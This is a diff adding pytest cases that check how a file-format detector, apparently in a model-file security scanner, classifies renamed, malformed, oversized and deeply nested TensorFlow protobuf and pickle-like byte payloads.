+    assert detect_file_format_from_magic(str(empty_node_savedmodel)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(empty_node_savedmodel)) == "unknown"
+    assert detect_file_format(str(empty_node_savedmodel)) == "unknown"
+
+
+def test_detect_oversized_renamed_tf_protobuf_rejects_malformed_field_two_payload(tmp_path: Path) -> None:
+    malformed_payload = tmp_path / "malformed-large.jpg"
+    malformed_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * 1024))
+
+    assert detect_file_format_from_magic(str(malformed_payload)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(malformed_payload)) == "unknown"
+    assert detect_file_format(str(malformed_payload)) == "unknown"
+
+
+def test_detect_oversized_renamed_tf_field_two_routes_to_bounded_scan(tmp_path: Path) -> None:
+    generic_payload = tmp_path / "candidate-large.jpg"
+    generic_payload.write_bytes(
+        _proto_length_field(1, b"\x0a\x01x") + b"\x12\x81\x80\x80\x0a" + (b"x" * (20 * 1024 * 1024 + 1))
+    )
+
+    assert detect_file_format_from_magic(str(generic_payload)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(generic_payload)) == "tf_metagraph"
+    assert detect_file_format(str(generic_payload)) == "tf_metagraph"
+
+
+def test_detect_renamed_tf_probe_budget_exhaustion_reports_inconclusive_route(tmp_path: Path) -> None:
+    generic_payload = tmp_path / "many-fields.jpg"
+    generic_payload.write_bytes(
+        b"".join(_proto_length_field(15, b"x") for _ in range(33000)) + _build_tf_metagraph_bytes()
+    )
+
+    assert detect_file_format_from_magic(str(generic_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_for_skip_filter(str(generic_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format(str(generic_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_renamed_tf_nested_probe_budget_exhaustion_reports_inconclusive_route(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    nested_group_payload = tmp_path / "nested-budget.jpg"
+    nested_group_payload.write_bytes(
+        b"{" + b"".join(_proto_varint_field(3, index) for index in range(33000)) + b"|" + _build_tf_metagraph_bytes()
+    )
+
+    assert detect_file_format_from_magic(str(nested_group_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert (
+        detect_file_format_for_skip_filter(str(nested_group_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    )
+    assert detect_file_format(str(nested_group_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_renamed_tf_nested_depth_exhaustion_reports_inconclusive_route(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_DEPTH", 2)
+    nested_payload = tmp_path / "deep-candidate.jpg"
+    nested_payload.write_bytes((b"[" * 3) + (b"\\" * 3) + _build_tf_metagraph_bytes())
+
+    assert detect_file_format_from_magic(str(nested_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_for_skip_filter(str(nested_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format(str(nested_payload)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_renamed_tf_after_flax_overlap_uses_strict_tensorflow_route(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_DEPTH", 2)
+    overlapping_payload = tmp_path / "flax-overlap.jpg"
+    overlapping_payload.write_bytes(
+        (b"[" * 3) + (b"\\" * 3) + _proto_length_field(15, b"\x81\xa6params\x80") + _build_tf_metagraph_bytes()
+    )
+
+    assert detect_file_format_from_magic(str(overlapping_payload)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(overlapping_payload)) == "tf_metagraph"
+    assert detect_file_format(str(overlapping_payload)) == "tf_metagraph"
+
+
+def test_detect_ambiguous_savedmodel_flax_overlap_reports_inconclusive_route(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_DEPTH", 2)
+    ambiguous_overlap = tmp_path / "saved-flax-overlap.jpg"
+    ambiguous_overlap.write_bytes(
+        (b"[" * 3)
+        + (b"\\" * 3)
+        + _proto_length_field(15, b"\x81\xa6params\x80")
+        + _build_tf_ambiguous_savedmodel_bytes()
+    )
+
+    assert detect_file_format_from_magic(str(ambiguous_overlap)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_for_skip_filter(str(ambiguous_overlap)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format(str(ambiguous_overlap)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_oversized_tf_flax_overlap_reports_inconclusive_route(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_DEPTH", 2)
+    oversized_overlap = tmp_path / "oversized-flax-overlap.jpg"
+    oversized_overlap.write_bytes(
+        (b"[" * 3)
+        + (b"\\" * 3)
+        + _proto_length_field(15, b"\x81\xa6params\x80")
+        + (b"x" * (20 * 1024 * 1024 + 2))
+        + _build_tf_metagraph_bytes()
+    )
+
+    assert detect_file_format_from_magic(str(oversized_overlap)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_for_skip_filter(str(oversized_overlap)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format(str(oversized_overlap)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_renamed_tf_candidate_payload_budget_reports_inconclusive_route(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_PAYLOAD_BYTES", 16)
+    candidate = tmp_path / "repeated-candidates.jpg"
+    candidate.write_bytes(
+        _proto_varint_field(1, 1) + _proto_length_field(2, b"\x00" * 12) + _proto_length_field(2, b"\x00" * 12)
+    )
+
+    assert detect_file_format_from_magic(str(candidate)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format_for_skip_filter(str(candidate)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert detect_file_format(str(candidate)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_oversized_renamed_tf_savedmodel_routes_to_bounded_scan(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    oversized_savedmodel = tmp_path / "saved-large.jpg"
+    seed = _build_tf_savedmodel_bytes()
+    oversized_savedmodel.write_bytes(seed + (b"x" * (20 * 1024 * 1024 + 1 - len(seed))))
+
+    assert detect_file_format_from_magic(str(oversized_savedmodel)) == "tf_savedmodel"
+    assert detect_file_format_for_skip_filter(str(oversized_savedmodel)) == "tf_savedmodel"
+    assert detect_file_format(str(oversized_savedmodel)) == "tf_savedmodel"
+
+
+def test_detect_versioned_protobuf_with_oversized_field_two_stays_inconclusive(tmp_path: Path) -> None:
+    oversized_savedmodel = tmp_path / "versioned-oversized-field-two.jpg"
+    oversized_metagraph_size = 20 * 1024 * 1024 + 1
+    oversized_savedmodel.write_bytes(
+        _proto_varint_field(1, 1)
+        + _encode_proto_varint((2 << 3) | 2)
+        + _encode_proto_varint(oversized_metagraph_size)
+        + (b"x" * oversized_metagraph_size)
+    )
+
+    assert detect_file_format_from_magic(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert (
+        detect_file_format_for_skip_filter(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    )
+    assert detect_file_format(str(oversized_savedmodel)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_oversized_renamed_tf_savedmodel_continues_past_empty_metagraph(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    savedmodel = tmp_path / "saved-repeated-large.jpg"
+    payload = (
+        _proto_varint_field(1, 1)
+        + _proto_length_field(2, b"")
+        + _proto_length_field(
+            2,
+            _build_tf_metagraph_bytes(),
+        )
+    )
+    savedmodel.write_bytes(payload + (b"x" * (20 * 1024 * 1024 + 1 - len(payload))))
+
+    assert detect_file_format_from_magic(str(savedmodel)) == "tf_savedmodel"
+    assert detect_file_format_for_skip_filter(str(savedmodel)) == "tf_savedmodel"
+    assert detect_file_format(str(savedmodel)) == "tf_savedmodel"
+
+
+def test_detect_oversized_renamed_tf_metagraph_with_metadata_routes_to_bounded_scan(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    oversized_metagraph = tmp_path / "graph-large.jpg"
+    oversized_graph_size = 20 * 1024 * 1024 + 1
+    oversized_metagraph.write_bytes(
+        _proto_length_field(1, _build_tf_metainfo_bytes())
+        + _encode_proto_varint((2 << 3) | 2)
+        + _encode_proto_varint(oversized_graph_size)
+        + (b"x" * oversized_graph_size)
+    )
+
+    assert detect_file_format_from_magic(str(oversized_metagraph)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(oversized_metagraph)) == "tf_metagraph"
+    assert detect_file_format(str(oversized_metagraph)) == "tf_metagraph"
+
+
+def test_detect_oversized_graph_only_tf_metagraph_reports_inconclusive_route(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    oversized_metagraph = tmp_path / "graph-only-large.jpg"
+    oversized_graph = _build_tf_function_graph_bytes() + _proto_length_field(99, b"x" * (20 * 1024 * 1024 + 1))
+    oversized_metagraph.write_bytes(_proto_length_field(2, oversized_graph))
+
+    assert detect_file_format_from_magic(str(oversized_metagraph)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    assert (
+        detect_file_format_for_skip_filter(str(oversized_metagraph)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+    )
+    assert detect_file_format(str(oversized_metagraph)) == TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT
+
+
+def test_detect_renamed_tf_metagraph_after_unknown_group_prefix(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    prefixed_metagraph = tmp_path / "group-prefixed.jpg"
+    prefixed_metagraph.write_bytes(b"\xa3\x06\x08\x01\xa4\x06" + _build_tf_metagraph_bytes())
+
+    assert detect_file_format_from_magic(str(prefixed_metagraph)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(prefixed_metagraph)) == "tf_metagraph"
+    assert detect_file_format(str(prefixed_metagraph)) == "tf_metagraph"
+
+
 def test_detect_tf_metagraph_rejects_renamed_non_protobuf(tmp_path: Path) -> None:
     """Reject text or arbitrary data renamed with `.meta` extension."""
     fake_metagraph = tmp_path / "not_meta.meta"
@@ -1709,12 +2468,23 @@ def test_detect_file_format_probe_boundary_prefixed_proto0_pickle(tmp_path: Path
 
 
 def test_detect_file_format_trivial_probe_boundary_prefix_not_pickle(tmp_path: Path) -> None:
-    """Large no-STOP scalar opcode prefixes should not be treated as pickle by themselves."""
+    """Fully inspected scalar-only text should not become a protobuf candidate."""
     payload = tmp_path / "probe-boundary-trivial-prefix-notes.txt"
     payload.write_bytes(b"I0\n0" * (PROTO0_1_MAX_PROBE_BYTES // 4 + 1))
 
-    assert detect_file_format(str(payload)) != "pickle"
-    assert detect_file_format_from_magic(str(payload)) != "pickle"
+    assert detect_file_format(str(payload)) == "unknown"
+    assert detect_file_format_from_magic(str(payload)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(payload)) == "unknown"
+
+
+def test_detect_file_format_trivial_text_with_binary_tail_remains_candidate(tmp_path: Path) -> None:
+    """A binary tail after scalar text padding must remain fail-closed."""
+    payload = tmp_path / "probe-boundary-trivial-prefix-with-tail.txt"
+    payload.write_bytes(b"I0\n0" * (PROTO0_1_MAX_PROBE_BYTES // 4 + 1) + (b"\x42\x00" * 4097))
+
+    assert detect_file_format(str(payload)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_from_magic(str(payload)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_for_skip_filter(str(payload)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
 
 
 def test_detect_file_format_exact_probe_boundary_prefix_without_stop_not_pickle(tmp_path: Path) -> None:
